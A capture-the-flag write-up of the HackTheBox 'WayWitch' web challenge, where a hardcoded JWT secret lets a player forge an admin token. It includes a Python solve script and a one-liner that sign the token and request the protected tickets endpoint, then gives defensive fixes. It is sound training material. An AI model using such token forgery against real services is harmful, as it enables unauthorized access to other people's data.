## Overview

`WayWitch` is a Very Easy HackTheBox **Web** challenge: a small Node/Express + SQLite
"Halloween party" ticket app served over HTTPS. Tickets are stored per-user, and the
admin's ticket holds the flag. Access to every ticket is gated behind a single check —
"is the JWT's `username` claim equal to `admin`?" The catch is that the server verifies
those tokens with a secret **hardcoded in the source code**, so we sign our own admin
token offline and read the flag. This is the simplest member of the JWT-from-a-leaked-secret
family ([broken authentication](https://cwe.mitre.org/data/definitions/287.html),
[CWE-798](https://cwe.mitre.org/data/definitions/798.html) /
[CWE-321](https://cwe.mitre.org/data/definitions/321.html)).

## The technique

The whole bug lives in two short files.

`util.js` verifies the session token and returns whatever `username` it carries:

```js
function getUsernameFromToken(token) {
  const secret = "halloween-secret";   // hardcoded HS256 key
  const decoded = jwt.verify(token, secret);
  return decoded.username;
}
```

`routes/index.js` then derives authorization purely from that claim:

```js
const username = getUsernameFromToken(sessionToken);
if (username === "admin") {
  const tickets = await db.get_tickets();   // every ticket, incl. the flag
  return res.status(200).json({ tickets });
}
```

And `database.js` seeds the admin ticket with the flag in its body:

```js
('Admin', 'admin', 'Top secret: ... Use this code to enter ${flag}')
```

Crucially, **no endpoint ever issues a token** — there is no login route. The app only
ever *verifies* tokens. A JWT signature only proves *who holds the signing key*; once that
key is public (here, it's right in the shipped source), the signature proves nothing and
anyone can mint a token for any identity.

## Solution

Forge a token with `{"username":"admin"}` signed HS256 with the leaked secret
`halloween-secret`, send it as the `session_token` cookie, and request the protected
`/tickets` endpoint. The flag is embedded in the admin ticket's content.

Create `solve.py`:

```python
import sys, jwt, requests
requests.packages.urllib3.disable_warnings()

host, port = sys.argv[1], sys.argv[2]
base = f"https://{host}:{port}"

token = jwt.encode({"username": "admin"}, "halloween-secret", algorithm="HS256")
r = requests.get(f"{base}/tickets",
                 cookies={"session_token": token}, verify=False, timeout=15)
print(r.text)
```

Run it against the instance:

```bash
python3 solve.py <target-host> <target-port>
```

The admin ticket comes back in the JSON response, and its `content` field contains
`HTB{...}` — flag captured.

Or as a single line:

```bash
python3 -c "import jwt,requests;t=jwt.encode({'username':'admin'},'halloween-secret',algorithm='HS256');print(requests.get('https://<host>:<port>/tickets',cookies={'session_token':t},verify=False).text)"
```

## Why it worked

Authentication and authorization were both pinned to a value the attacker controls. The
server trusted a self-asserted `username` claim, and the only thing standing between an
attacker and an arbitrary claim — the HMAC signature — was useless because its key shipped
in the application source. With the key public, forging a valid `admin` token is a one-line
operation, and the `username === "admin"` gate falls open.

## Fix / defense

- Load the signing secret from a secrets manager or environment variable with high entropy;
  never commit it to source.
- Prefer asymmetric signing ([RS256](https://cwe.mitre.org/data/definitions/321.html)) so
  verifiers never hold the signing key — a read-only leak of the public key can't forge tokens.
- Don't derive authorization from a self-asserted JWT claim. Bind roles to a server-side
  identity/session store, and issue tokens server-side only.
- Rotate the secret immediately on any suspected leak.
